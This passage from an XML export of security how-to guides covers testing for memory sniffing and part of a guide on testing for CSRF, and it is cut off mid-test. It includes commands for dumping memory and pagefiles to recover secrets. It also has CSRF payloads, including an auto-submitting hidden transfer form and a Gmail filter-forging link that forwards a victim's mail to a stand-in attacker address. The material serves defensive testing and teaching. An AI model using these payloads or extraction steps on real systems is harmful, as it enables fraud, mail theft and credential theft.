&lt;li&gt;RAM - physical memory that stores data used by running processes. &lt;/li&gt;&lt;li&gt;Virtual memory - logical address space given by the system to each running process. It gets copied into random access memory and swapped out to swap files by the operating system.
&lt;/li&gt;&lt;li&gt;Swap files - RAM’s auxiliary storage. The operating system performs paging to swap the contents of RAM in and out of swap files.
&lt;/li&gt;&lt;li&gt;Memory dumps - Memory dumps are snapshots of a process’s virtual memory; they are created by the system when the process crashes.&amp;nbsp;&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;Note that permanent storage of user files, databases, and the Windows registry is outside of the scope of this vulnerability. Permanent memory can be protected using permissions and relate to information disclosure attacks.&lt;/p&gt;
&lt;p&gt;Memory sniffing bugs commonly relate to local attacks requiring access to the target computer. Once the attacker is logged in, he uses a tool to recover sensitive data such as passwords or keys from temporary memory.&lt;/p&gt;
&lt;p&gt;In detail:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Attacker logs in to target machine.* &lt;/li&gt;&lt;li&gt;Attacker uses a script or tool to search memory for sensitive data. The attack ends if sensitive data is recovered is an unhashed/unencrypted form.
&lt;/li&gt;&lt;li&gt;If sensitive data is hashed or encrypted, the attacker uses a cryptographic attack to recover sensitive data in plain-text.&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;* Variations of this attack focus on capturing sensitive information without access to the target machine. For instance, forensic research shows that the contents of a computer’s RAM can be retrieved through a FireWire cable [i]. Furthermore, recent discoveries
 indicate that sensitive information from DRAM chips can be restored by removing them after the computer has been turned off.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Step 2: Analyze Causes and Countermeasures&lt;/h1&gt;
&lt;p&gt;The next step in testing for memory sniffing is to understand what causes this vulnerability and how to countermeasure it.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Clearing data structures containing sensitive information &lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;A classic approach to protect against memory sniffing attacks is to clear data structures, such as arrays, used to temporarily store sensitive information. For instance, the code below is insecure:&lt;/p&gt;
&lt;pre&gt;&lt;/pre&gt;
&lt;pre&gt;void GetData(char *MFAddr) { &lt;br&gt;  char pwd[64];&lt;br&gt;&amp;nbsp;  if (GetPasswordFromUser(pwd, sizeof(pwd))) {&lt;br&gt;&amp;nbsp;&amp;nbsp;    if (ConnectToMainframe(MFAddr, pwd)) {&lt;br&gt;&amp;nbsp;&lt;br&gt;&amp;nbsp;    &amp;nbsp;// Interaction with mainframe&lt;br&gt;&amp;nbsp;&lt;br&gt;&amp;nbsp;    &amp;nbsp;}&lt;br&gt;&amp;nbsp;  }&lt;br&gt;}&lt;/pre&gt;
&lt;p&gt;The function &lt;em&gt;GetPasswordFromUser&lt;/em&gt; copies a password provided by the user to the
&lt;em&gt;pwd&lt;/em&gt; character array. The application then returns from the function without cleaning the password from memory. To mitigate this attack, developers are encouraged to set the memory contents to zero after the process is done with the structure used to
 store it:&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;void GetData(char *MFAddr) { &lt;br&gt;  char pwd[64];&lt;br&gt;&amp;nbsp;  if (GetPasswordFromUser(pwd, sizeof(pwd))) {&lt;br&gt;    if (ConnectToMainframe(MFAddr, pwd)) {&lt;br&gt;&amp;nbsp;&lt;br&gt;&amp;nbsp;    &amp;nbsp;// Interaction with mainframe&lt;br&gt;&amp;nbsp;&lt;br&gt;    &amp;nbsp;&amp;nbsp;}&lt;br&gt;&amp;nbsp;  }&lt;br&gt;&amp;nbsp;  &lt;strong&gt;memset(pwd, 0, sizeof(pwd));&lt;br&gt;&lt;/strong&gt;}&lt;br&gt;&lt;/pre&gt;
&lt;p&gt;However, it is extremely important to know that &lt;em&gt;memset&lt;/em&gt; might not work as intended if compiler optimizations are on. Make sure to turn off compiler optimizations if protecting your code using
&lt;em&gt;memset&lt;/em&gt; as shown above. For more information, refer to &lt;em&gt;OWASP’s Insecure Compiler Optimization
&lt;/em&gt;[ii].&lt;/p&gt;
&lt;p&gt;Another way of clearing out memory is by traversing the array and setting each element to zero:&lt;/p&gt;
&lt;pre&gt;&lt;br&gt;void erase_string(char *s) {&lt;/pre&gt;
&lt;pre&gt;  while(*s) { *s&amp;#43;&amp;#43; = 0; }&lt;/pre&gt;
&lt;pre&gt;}&lt;/pre&gt;
&lt;p&gt;This technique is recommended, because it doesn’t depend on compiler optimizations or knowledge of the array’s size. To properly secure your application, it is suggested that you add similar zeroing-out techniques after returning from function calls that
 deal with sensitive data and also in every destructor of classes that deal with secrets such as passwords and cryptographic elements.&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Locking sensitive memory &lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Zeroing out sensitive memory is an effective technique to keep sensitive data in virtual memory (and consequently in RAM and swap files) as briefly as possible. However, this data might still get swapped by the operating system’s paging system into swap
 files before the application has a chance to clean it, increasing the risk of harm from a memory sniffing attack.
&lt;/p&gt;
&lt;p&gt;It is possible to mitigate this condition by locking virtual address pages from being swapped. This can be achieved in the UNIX platforms by using
&lt;em&gt;mlock&lt;/em&gt; as below [iii]:&lt;/p&gt;
&lt;pre&gt;#include &amp;lt;sys/mman.h&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&lt;br&gt;void *locking_alloc(size_t numbytes) {&lt;/pre&gt;
&lt;pre&gt;  static short have_warned = 0;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;  void *mem = malloc(numbytes);&lt;/pre&gt;
&lt;pre&gt;&lt;br&gt;  if(mlock(mem, numbytes) &amp;amp;&amp;amp; !have_warned) {&lt;br&gt;&amp;nbsp;&lt;br&gt;    /* We probably do not have permission.&lt;br&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;       * Sometimes, it might not be possible to lock enough memory.&lt;br&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;       */&lt;/pre&gt;
&lt;pre&gt;    fprintf(stderr, &amp;quot;Warning: Using insecure memory!\n&amp;quot;);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;    have_warned = 1;&lt;br&gt;&amp;nbsp;&lt;br&gt;  } &lt;/pre&gt;
&lt;pre&gt;  return mem;&lt;br&gt;}&lt;/pre&gt;
&lt;p&gt;In Windows, the Win32 API VirtualLock is used for the same purpose.&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Disable the creation of dump files&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;An attacker might execute a memory sniffing attack by crashing an application and accessing the core dumps created by the system upon the crash. Any sensitive data loaded by the application into any data structure will appear in dump files for the attacker
 to leverage. To mitigate this condition, processes must disable the creation of dump files right from the start. This is achieved using the
&lt;em&gt;setrlimit&lt;/em&gt; API both in UNIX and Windows platforms [iv]:&lt;/p&gt;
&lt;pre&gt;char pwd[MAX_PWD_LEN];&lt;br&gt;if(setrlimit(RLIMIT_CORE, 0) != 0) {&lt;br&gt;  /* deal with error */&lt;br&gt;}&lt;br&gt;&amp;nbsp;&lt;br&gt;fgets(pwd, MAX_PWD_LEN, stdin);&lt;/pre&gt;
&lt;h2&gt;&lt;em&gt;Additional countermeasures&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Additional defenses against memory sniffing attacks include deleting the page file on reboot or shutdown (this can be done by setting a registry value in Windows), and using forensic tools to scrub all different types of system memory. In addition, research
 is moving towards encrypting the contents of RAM and swap files and storing the encryption key in hardware.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Step 3: Start Testing and Exploring&lt;/h1&gt;
&lt;p&gt;Now that you understand the basic theory behind memory sniffing attacks, it is necessary to execute practical test cases to check if your application is vulnerable. If you have implemented countermeasures, it is important to execute these tests before and
 after adding the countermeasures to test their effectiveness.&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Test for sensitive data in RAM&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;In Windows platforms, follow these steps to create a record of physical memory in a text file:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Log into a Windows host running the application under test. &lt;/li&gt;&lt;li&gt;Download and install ManTech’s Memory DD (&lt;a href="https://sourceforge.net/projects/mdd/)"&gt;https://sourceforge.net/projects/mdd/)&lt;/a&gt;.
&lt;/li&gt;&lt;li&gt;Open command prompt with administrative privileges. &lt;/li&gt;&lt;li&gt;Run mdd as follows: &lt;strong&gt;mdd_1.3.exe -o c:\ram.txt -v&lt;/strong&gt; &lt;/li&gt;&lt;li&gt;Once mdd finishes executing, read output file ram.txt for sensitive information.&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;Expected results: ram.txt must not show any sensitive data.&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Test for sensitive data in virtual memory&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;The best way to search your application’s virtual memory for secrets is to use a debugger to create a dump of the virtual memory space at any given time:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Log into a Windows host running the application under test. &lt;/li&gt;&lt;li&gt;Download and run user-mode Windows debugging &lt;em&gt;windbg.&lt;/em&gt; &lt;/li&gt;&lt;li&gt;Attach windbg to the application under test. &lt;/li&gt;&lt;li&gt;Break into the debugger and specify the option to create a full dump for the application’s virtual memory:
&lt;strong&gt;.dump /f c:\dump.txt&lt;/strong&gt;&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;Expected results: dump.txt must not show any sensitive data.&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Test for sensitive data in swap files&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;In Windows, swap files are stored in the &lt;em&gt;pagefile:&lt;/em&gt; &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Log into a Windows host running the application under test. &lt;/li&gt;&lt;li&gt;Find pagefile&lt;em&gt;. &lt;/em&gt;It is named &lt;em&gt;pagefile.sys&lt;/em&gt; and is usually on the root drive of the Windows partition (i.e. c:\pagefile.sys).
&lt;/li&gt;&lt;li&gt;Open read-only copy of a file. &lt;/li&gt;&lt;li&gt;Search for sensitive information in pagefile.&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;Expected results: pagefile must not show sensitive information.&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Test for sensitive data in dump files&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Follow these steps test for sensitive information in dump files:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Log into a Windows host running the application under test. &lt;/li&gt;&lt;li&gt;Find the dump files (in Windows, this is indicated in HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\CrashControl).
&lt;/li&gt;&lt;li&gt;Open a dump file and search for sensitive information. &lt;/li&gt;&lt;li&gt;Repeat for each of the dump files&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;Expected results: dump files must not show sensitive information.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Step 4: Execute Additional Testing&lt;/h1&gt;
&lt;p&gt;If the sensitive data cannot be easily recognized, you must do additional testing. During each of the tests above, the attacker needs to interpret the output. Running each of the tools creates an output file with a large quantity of data that is irrelevant
 to the test. A good way to find secrets is running a command such &lt;em&gt;strings&lt;/em&gt; on the output file [v] in order to display all character arrays in the file:&lt;/p&gt;
&lt;pre&gt;&lt;br&gt;C:\Documents and Settings\All Users\Documents\DrWatson&amp;gt;strings user.dmp&lt;br&gt;12&lt;/pre&gt;
&lt;pre&gt;…&lt;br&gt;kernel32.dll&lt;br&gt;RASAPI32&lt;br&gt;C:\WINNT\tracing&lt;br&gt;C:\Documents and Settings\Administrator\My Documents\PGP\pubring.pkr&lt;br&gt;C:\Documents and Settings\Administrator\My Documents\PGP\secring.skr&lt;br&gt;&amp;amp; !&lt;br&gt;IN PGP MESSAGE-----&lt;br&gt;Version: PGP 7.1&lt;br&gt;qANQR1DBwU4DSL6Q3OHRwOYQB/9pKnnhZGQRFwykWzBO1EWkzW336QOkUaHj0aVj&lt;br&gt;P1MgxDWQWi3kZpOfGnDg6kbQriWBiIgD/z8p5xGN&amp;#43;WcksytlLJv8OxvTGMepx7u8&lt;br&gt;h5aVRXZd8YPM&amp;#43;h5ROpbnNw&amp;#43;SiT/w9oCy/ChWeiCHV1swQSzwBHx2Ye&amp;#43;yxO70Moxc&lt;br&gt;...&lt;br&gt;frAG3nM7kOnChQp4jxhv2J0p7fL1vteI9EGbcimC9QCVBwC1U&amp;#43;&amp;#43;mQIqbTyIw5gWK&lt;br&gt;Io11yl8P&amp;#43;wKjcHsLfi2hTE&amp;#43;NIRb&amp;#43;VORWhVoCDHgNKV1nSFNTK0LEnvz84OFyRc1z&lt;br&gt;-----END PGP MESSAGE-----&lt;br&gt;&lt;strong&gt;&amp;lt;pgppassphrase!&amp;gt;&lt;/strong&gt;&lt;br&gt;…&lt;br&gt;&amp;nbsp;&lt;/pre&gt;
&lt;p&gt;Hex editors and similar low-level file processing tools must be used to identify sensitive data. Additional techniques include performing dictionary or linear searches. For example, in Linux refer to
&lt;em&gt;Cryptographic Key Recovery from Linux Memory Dumps &lt;/em&gt;[vi]&lt;em&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Conclusions&lt;/h1&gt;
&lt;p&gt;Memory sniffing attacks aim at recovering sensitive data in system memory, including virtual memory, RAM, and swap files.In order to properly test for this bug, it is necessary to understand the anatomy of the attack scenario as well as why it is caused
 and how to protect against it.Then, you must use a set of available tools to check for it in your application by making records of the different types of memory and searching them for sensitive data.&lt;strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;br&gt;
&lt;/p&gt;
&lt;hr&gt;
&lt;br&gt;
&lt;div&gt;
&lt;div&gt;
&lt;p&gt;[i] &lt;strong&gt;Hit by a Bus: Physical Access Attacks with Firewire.&amp;nbsp; Adam Boileau.&amp;nbsp;
&lt;/strong&gt;Security-Assesment.com.&amp;nbsp; &lt;a href="http://www.storm.net.nz/static/files/ab_firewire_rux2k6-final.pdf"&gt;
http://www.storm.net.nz/static/files/ab_firewire_rux2k6-final.pdf&lt;/a&gt;&lt;strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;[ii] &lt;strong&gt;Insecure Compiler Optimization&lt;/strong&gt;. OWASP. &lt;a href="http://www.owasp.org/index.php/Insecure_Compiler_Optimization"&gt;
http://www.owasp.org/index.php/Insecure_Compiler_Optimization&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[iii] &lt;strong&gt;Protecting sensitive data in memory.&amp;nbsp; &lt;/strong&gt;John Viega.&amp;nbsp; CGI Security.&amp;nbsp;
&lt;a href="http://www.cgisecurity.com/lib/protecting-sensitive-data.html"&gt;http://www.cgisecurity.com/lib/protecting-sensitive-data.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[iv] &lt;strong&gt;VOID MSC14-A. Protect memory when working with sensitive data&lt;/strong&gt;. Alex Volkovitsky CERT.&amp;nbsp;
&lt;a href="https://www.securecoding.cert.org/confluence/display/seccode/VOID&amp;#43;MSC14-A.&amp;#43;Protect&amp;#43;memory&amp;#43;when&amp;#43;working&amp;#43;with&amp;#43;sensitive&amp;#43;data"&gt;
https://www.securecoding.cert.org/confluence/display/seccode/VOID&amp;#43;MSC14-A.&amp;#43;Protect&amp;#43;memory&amp;#43;when&amp;#43;working&amp;#43;with&amp;#43;sensitive&amp;#43;data&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[v] &lt;strong&gt;Practical Approaches to Recovering Encrypted Digital Evidence. &lt;/strong&gt;
Eoghan Casey&lt;strong&gt;.&amp;nbsp; &lt;/strong&gt;&lt;a href="http://www.utica.edu/academic/institutes/ecii/publications/articles/A04AF2FB-BD97-C28C-7F9F4349043FD3A9.pdf"&gt;http://www.utica.edu/academic/institutes/ecii/publications/articles/A04AF2FB-BD97-C28C-7F9F4349043FD3A9.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[vi] &lt;strong&gt;Cryptographic Key Recovery from Linux Memory Dumps&lt;/strong&gt;. Torbjörn Pettersson.&amp;nbsp;
&lt;a href="http://events.ccc.de/camp/2007/Fahrplan/attachments/1300-Cryptokey_forensics_A.pdf"&gt;
http://events.ccc.de/camp/2007/Fahrplan/attachments/1300-Cryptokey_forensics_A.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>5339f0d4-6052-44a5-9d83-09a116ffdd13</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>How to Test for Cross-Site Request Forgery (CSRF) Bugs</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Session Management</category>
    <phase>Test</phase>
    <rule_Type>How To</rule_Type>
    <priority>Andres De Vivanco</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to:&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Web applications written in languages such as Java, C#, VB .Net, PHP, and Ruby.&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Summary&lt;/h1&gt;
&lt;p&gt;During Cross-Site Request Forgery (CSRF) -also known as &lt;em&gt;XSRF&lt;/em&gt; or &lt;em&gt;session riding&lt;/em&gt;- attacks, an attacker forces a victim to make an unexpected web request such as a fraudulent bank transaction.&amp;nbsp;&amp;nbsp; For example, an attacker tricks the victim client
 into calling a banking function in a vulnerable page that transfers money from the victim’s to the attacker’s account.&amp;nbsp; The victim triggers the attack by following an attacker’s link or visiting an attacker’s page.&amp;nbsp; The vulnerable server page doesn’t recheck
 the authenticity of the victim’s request and allows the transfer to proceed.&lt;/p&gt;
&lt;p&gt;Follow these steps to test for CSRF bugs:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Step 1:&amp;nbsp; Understand Attack Scenarios &lt;/li&gt;&lt;li&gt;Step 2:&amp;nbsp; Analyze Causes and Countermeasures &lt;/li&gt;&lt;li&gt;Step 3:&amp;nbsp; Start Testing and Exploring &lt;/li&gt;&lt;li&gt;Step 4:&amp;nbsp; Fine-tune Test Cases&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Step 1:&amp;nbsp; Understand Attack Scenarios&lt;/h1&gt;
&lt;p&gt;The first step in testing for CSRF bugs is to understand its attack scenarios.&amp;nbsp; Even though the anatomy of a CSRF attack is almost always constant, its objectives may vary:&amp;nbsp; attackers can exploit CSRF bugs to perform unauthorized fraudulent banking transactions,
 send spoofed email messages, steal sensitive information, and even install a back door.&amp;nbsp; The following steps detail the anatomy of a CSRF attack:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Attacker finds functionality in a web application that is vulnerable to CSRF.
&lt;/li&gt;&lt;li&gt;Attacker builds a link invoking the vulnerable function and passing the required parameters as to executed the chosen attack.
&lt;/li&gt;&lt;li&gt;Attacker waits until the victim client authenticates with the vulnerable web application.
&lt;/li&gt;&lt;li&gt;Attacker tricks victim client into following the malicious link. &lt;/li&gt;&lt;li&gt;Victim client sends forged request to vulnerable server. &lt;/li&gt;&lt;li&gt;Vulnerable server allows and executes the forged request. &lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;The form of the link built in step 2 depends on the payload that the attacker wants to execute.&amp;nbsp; For example, the link might looks like this when they payload is to transfer money from the victim’s to the attacker’s account:&lt;/p&gt;
&lt;pre&gt;&lt;strong&gt;&lt;a&gt;/makeTransfer?amount=1000&amp;amp;dest=attacker@attackersite.com'&lt;/a&gt;&lt;/strong&gt;&amp;nbsp;&lt;/pre&gt;
&lt;p&gt;The link below sends an email titled Hello to johny@example.com: &lt;/p&gt;
&lt;pre&gt;&lt;strong&gt;/sendMail?to=johny@example.com&amp;amp;title=Hello&amp;amp;body=I&amp;#43;did&amp;#43;not&amp;#43;send&amp;#43;this'&lt;/strong&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;A serious flaw discovered in Google’s Gmail early in 2007 allowed attackers to install a backdoor to forward all emails to them.&amp;nbsp; In the link below the attacker forwards the victim to the attacker’s site.&amp;nbsp; Then the attacker’s site makes the fraudulent request
 in behalf of the victim:&lt;/p&gt;
&lt;pre&gt;&lt;strong&gt;http://www.attakersite.org/util/csrf?method=POST&amp;amp;enctype=multipart/form-data&amp;amp;_action=https%3A//mail.google.com/mail/h/ewt1jmuj4ddv/%3Fv%3Dprf&amp;amp;cf2emc=true&amp;amp;cf2_email=attacker@attackersite.com&amp;amp;cf1_from&amp;amp;cf1_to&amp;amp;cf1_subj&amp;amp;cf1has&amp;amp;cf1hasnot&amp;amp;cf1attach=true&amp;amp;tfi&amp;amp;s=z&amp;amp;irf=on&amp;amp;nvpbucftb=Create%20Filter&lt;/strong&gt;&lt;/pre&gt;
&lt;p&gt;Upon receiving the forged HTTP POST request, Gmail forwards all the victim’s emails to attacker@attackersite.com.&amp;nbsp; Furthermore, the attack installs a filter that works as a backdoor for hijacking future emails.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Step 2:&amp;nbsp; Analyze Causes and Countermeasures&lt;/h1&gt;
&lt;p&gt;During this step you will be shown the causes behind Cross-Site Request Forgery , &amp;nbsp;how to recognize it within your code base and you will be shown coding best practices, as to avoid this issue altogether.&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Cross-Site Request Forgery Causes&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;This kind of vulnerability exists because the web application trusts the forged request.&amp;nbsp; Thus, the cause for this bug is a case of poor or missing authentication code.&amp;nbsp; The application lacks the functionality to verify that every client request is not forged
 and that it actually originates from a legitimate client action.&amp;nbsp;&amp;nbsp; Web applications vulnerable to CSRF implement a
&lt;em&gt;persistent&lt;/em&gt; authentication system in which they validate the user against a persistent token such as a session cookie.&amp;nbsp;&amp;nbsp; In persistent authentication, when the server receives a request it only checks if the user is logged in and not if the request
 comes due to a legitimate client action.&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Cross-Site Request Forgery Countermeasures&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;The main prevention against CSRF vulnerabilities is to provide a &lt;em&gt;transient&lt;/em&gt; authentication system [i] instead of a persistent authentication system.&amp;nbsp; Transient authentication systems verify for the authenticity of every request by using an additional
 check.&amp;nbsp;&amp;nbsp; One way of doing this is to transmit a secret in every URL; especially require a secret in URLs that request create, update, delete, or mail actions.&amp;nbsp; An attacker will not be able to execute an attack unless he knows the secret.&amp;nbsp; The problem is that
 an attacker can execute a XSS attack and steal the secret.&lt;/p&gt;
&lt;p&gt;There is no silver bullet against CSRF attacks so developers need to look for ways of raising the bar against attackers.&amp;nbsp;&amp;nbsp; A popular way to protect Internet users from CSRF is by using
&lt;em&gt;CAPTCHAs&lt;/em&gt; (Completely Automated Turing Test to Test Computers and Humans Apart) that require the client to validate the contents of a bitmap image before the application allows any requests.&lt;/p&gt;
&lt;p&gt;Other preventions suggested include using POSTs instead of GETs requests to perform actions and or to check the HTTP referrer header.&amp;nbsp; However, both of these countermeasures can be defeated by a knowledgeable attacker since he can easily forge a POST command
 using a malicious script and can also easily spoof the HTTP referrer.&amp;nbsp; &lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Step 3:&amp;nbsp; Start Testing and Exploring&lt;/h1&gt;
&lt;p&gt;Now that you’ve learned how CSRF attacks work and how to defend against them, this step shows the basic test cases to execute to start testing for CSRF bugs.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Basic Test for Cross-site Request Forgery &lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Follow these test steps to test against CSRF bugs. &lt;strong&gt;&lt;em&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Find a web application page that performs an action based on a user request. &lt;/li&gt;&lt;li&gt;Construct a page containing a link or redirect that sends a forged request to the application server.&amp;nbsp; This link usually contains a tag such as an img or iframe (although mostly any tags can be used) with the source address pointing to the request:
&lt;ul&gt;
&lt;li&gt;
&lt;pre&gt;&amp;lt;a href=&amp;quot;http://bank.com/transfer.do?acct=MARIA&amp;amp;amount=100000&amp;quot;&amp;gt;View my Pictures!&amp;lt;/a&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;img src=&amp;quot;http://bank.com/transfer.do?acct=MARIA&amp;amp;amount=100000&amp;quot; width=&amp;quot;1&amp;quot; height=&amp;quot;1&amp;quot; border=&amp;quot;0&amp;quot;&amp;gt;&amp;nbsp;&lt;/pre&gt;
&lt;p&gt;Note that the links above will both generate a GET request.&amp;nbsp; In order to test for POST requests you must create a page containing a form with the URL parameters passed as hidden input, and add a script to automatically submit the form:&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&amp;lt;form action=&amp;quot;http://bank.com/transfer.do&amp;quot; method=&amp;quot;post&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;acct&amp;quot; value=&amp;quot;MARIA&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;ammount&amp;quot; value=&amp;quot;100000&amp;quot;&amp;gt;&lt;br&gt;&amp;lt;/form&amp;gt; &lt;br&gt;&amp;lt;script&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; document.forms[0].submit();&lt;br&gt;&amp;lt;/script&amp;gt;&lt;br&gt;&lt;/pre&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;Open an Internet browser and log in to the web application as a legitimate user.
&lt;/li&gt;&lt;li&gt;Open the page built in step 2 (follow the link if necessary). &lt;/li&gt;&lt;li&gt;Confirm if the request was successful. &lt;/li&gt;&lt;li&gt;Repeat test case for every application create/update/delete/mail action.&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;Expected result:&amp;nbsp; the test fails if the application trusts and processes the forged request.&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Test Use of Secret in URLs&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;This test will tell you if your application uses secrets in the URL.&lt;/p&gt;
&lt;p&gt;Testing steps:&lt;strong&gt;&lt;em&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Log in to the application as a legitimate user. &lt;/li&gt;&lt;li&gt;Browse to a web form that makes a valid request and uses a secret in the URL:&amp;nbsp;
&lt;ul&gt;
&lt;li&gt;
&lt;pre&gt;http://example.com/makeTransfer?amount=1000&amp;amp;dest=attacker@attackersite.com'&amp;amp;secret=2y9ryo2hr2&lt;/pre&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;Start intercepting network traffic using HTTP(s) WebScarab&lt;a href="about:blank#_edn2" name="x__ednref2"&gt;[ii]&lt;/a&gt; proxy.
&lt;/li&gt;&lt;li&gt;Configure browser to use WebScarab proxy. &lt;/li&gt;&lt;li&gt;Make another request. &lt;/li&gt;&lt;li&gt;In WebScarab, modify the URL to change the secret to another value:
&lt;ul&gt;
&lt;li&gt;
&lt;pre&gt;http://example.com/makeTransfer?amount=1000&amp;amp;dest=attacker@attackersite.com'&amp;amp;secret=&lt;strong&gt;XXXXXXXXXXX&lt;/strong&gt;&lt;/pre&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;br&gt;
&lt;p&gt;Expected result:&amp;nbsp; The server must disallow the action since the secret was changed in step 6.&amp;nbsp; The test fails if the server allows the requested action.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Test Use of Secret in Cookies&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;This test will tell you if your application properly uses secrets in the cookies.&lt;/p&gt;
&lt;p&gt;Testing steps:&lt;strong&gt;&lt;em&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Start intercepting traffic network traffic using WebScarab proxy. &lt;/li&gt;&lt;li&gt;Open a browser, configure it to go through WebScarab proxy, and log in to the application as a legitimate user.
&lt;/li&gt;&lt;li&gt;Browse to a page that makes a request and submits a secret using a cookie. &lt;/li&gt;&lt;li&gt;Submit request. &lt;/li&gt;&lt;li&gt;In WebScarab, replace the secret in the cookie.&amp;nbsp; For instance: &lt;/li&gt;&lt;/ol&gt;
&lt;blockquote&gt;
